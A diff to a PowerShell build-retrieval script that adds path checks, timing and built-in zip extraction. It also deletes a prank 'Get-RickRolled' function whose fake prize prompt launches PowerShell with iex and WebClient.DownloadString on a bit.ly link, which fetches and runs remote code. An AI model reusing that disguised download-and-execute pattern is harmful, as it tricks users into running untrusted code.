@@ -29,7 +29,6 @@ param(
 
 begin {
     $ErrorActionPreference = "Stop"
-    . "$PSScriptRoot\..\Build\Build-Libraries.ps1"
     Set-StrictMode -Version Latest
 
     Write-Host "Running '$($MyInvocation.MyCommand.Name.Replace(`".ps1`", `"`"))' with the following parameters:" -ForegroundColor Cyan
@@ -81,6 +80,11 @@ begin {
         }
 
         process {
+            if (-not (Test-Path -Path $dropRoot)) {
+                Write-Error "Drop path: '$droproot' does not exist."
+                exit 1
+            }
+
             if ($clearBinariesDirectory.IsPresent) {
                 Clear-Environment -binariesDirectory $binariesDirectory
             }
@@ -99,7 +103,7 @@ begin {
                 
                 Write-Host "`r`nCopying files:"
                 Write-Host ($binaries.FullName | Format-List | Out-String)
-                Write-Host "`r`nTo directory:"
+                Write-Host "To directory:"
                 Write-Host "$binariesDirectory`r`n"
         
                 [TimeSpan]$executionTime = Measure-Command { ForEach-Object -InputObject $binaries { Copy-Item -Path $_.FullName -Destination $binariesDirectory } }
@@ -112,6 +116,8 @@ begin {
             if ($components.Count -gt 1) {
                 Write-Host "Total binary acquisition time: $totalTime seconds." -ForegroundColor Cyan
             }
+
+            return $totalTime
         }
     }
 
@@ -120,74 +126,74 @@ begin {
         .Synopsis
             Extracts all archives in the binaries directory.
         #>
-        begin {
-            [string]$zipExe = Join-Path -Path "$PSScriptRoot\..\Build.Tools" -ChildPath "\7z.exe"
-        }
-        
-        process {
-            if (-not (Test-Path $zipExe)) {
-                Write-Error "7-Zip executable not present at: '$zipExe'."
-                exit 1
-            }
+        param (
+            [Parameter(Mandatory=$true)][ValidateNotNullOrEmpty()][string]$binariesDirectory
+        )
 
+        process {
             [System.IO.FileInfo[]]$archives = Get-ChildItem -Path $binariesDirectory -File -Filter "*.zip"
 
             if ($null -eq $archives) {
-                Write-Warning "No archives discovered at path: '$binariesDirectory'."
+                Write-Host "No archives discovered at path: '$binariesDirectory'."
                 return
             }
 
+            Add-Type -AssemblyName "System.IO.Compression.FileSystem, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+            [double]$totalTime = 0
+
+            Write-Host "`r`nExtracting archives:"
+            Write-Host ($archives.FullName | Format-List | Out-String)
+            Write-Host "To directory:"
+            Write-Host "$binariesDirectory`r`n"
+
             foreach ($archive in $archives) {
-                & $zipExe x $archive.FullName "-o$binariesDirectory" -y
+                [TimeSpan]$executionTime = Measure-Command { [System.IO.Compression.ZipFile]::ExtractToDirectory($archive.FullName, $binariesDirectory) }
+                Write-Host "Extracted archive: '$($archive.Name)' in: $([System.Math]::Round($executionTime.TotalSeconds, 2)) seconds." -ForegroundColor Cyan
+                $totalTime = $totalTime + [System.Math]::Round($executionTime.TotalSeconds, 2)
             }
+        }
+
+        end {
+            if ($archives.Count -gt 1) {
+                Write-Host "`r`nTotal archive extraction time: $totalTime seconds." -ForegroundColor Cyan
+            }
+
+            return $totalTime
         }
     }
 
-    function Get-RickRolled {
-        <#
-        .Synopsis
-            Invokes Rick Astley.
-        #>
-        begin {
-            [string]$title = "Claim prize?"
-            [string]$message = "You have won a prize!!! Do you want to claim it?"
-        }
 
-        process {
-            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes"
-            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No"
-        
-            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
-            $result = $host.ui.PromptForChoice($title, $message, $options, 0)
-            switch ($result) {
-                0 {Start-Process powershell -ArgumentList '-noprofile -noexit -command iex (New-Object Net.WebClient).DownloadString(''http://bit.ly/e0Mw9w'')' }
-            }
-        }
-    }
 }
 
 
 process {
+    [double]$totalTime = 0
+
     switch ($PSCmdlet.ParameterSetName) {
         "Branch" {
             [string]$branchDropRoot = Join-Path -Path $dropRoot -ChildPath "product\refs\heads\$branch"
+
+            if (-not (Test-Path -Path $branchDropRoot)) {
+                Write-Error "Failed to retrieve binaries for branch: '$branch'`r`n at directory: '$branchDropRoot'."
+                exit 1
+            }
+
             [string]$build = Join-Path $branchDropRoot -ChildPath (Get-ChildItem -Path $branchDropRoot -Directory | Sort-Object -Property Name | Select-Object -First 1)
 
-            Copy-Binaries -dropRoot $build -binariesDirectory $binariesDirectory -components $components -clearBinariesDirectory
+            $totalTime = (Copy-Binaries -dropRoot $build -binariesDirectory $binariesDirectory -components $components -clearBinariesDirectory)
         }
         "PullRequest" {
-            # ToDo: Remove a pulls from this path.
-            [string]$pullRequestDropRoot = Join-Path -Path $dropRoot -ChildPath "pulls\pulls\$pullRequestId"
+            [string]$pullRequestDropRoot = Join-Path -Path $dropRoot -ChildPath "pulls\$pullRequestId"
 
-            Copy-Binaries -dropRoot $pullRequestDropRoot -binariesDirectory $binariesDirectory -components $components -clearBinariesDirectory
+            $totalTime = (Copy-Binaries -dropRoot $pullRequestDropRoot -binariesDirectory $binariesDirectory -components $components -clearBinariesDirectory)
         }
     }
 
-    Export-Archives
+    $totalTime = $totalTime + (Export-Archives -binariesDirectory $binariesDirectory)
 }
 
 end {
-    Write-Host "`r`nProduct retrieved.`r`n" -ForegroundColor Cyan
+    Write-Host "`r`nProduct retrieved in $totalTime seconds.`r`n" -ForegroundColor Cyan
 
     if ([System.Environment]::UserInteractive -and $host.Name -eq "ConsoleHost") {
         [bool]$psInteractive = (-not [System.Environment]::GetCommandLineArgs() -Contains '-NonInteractive')
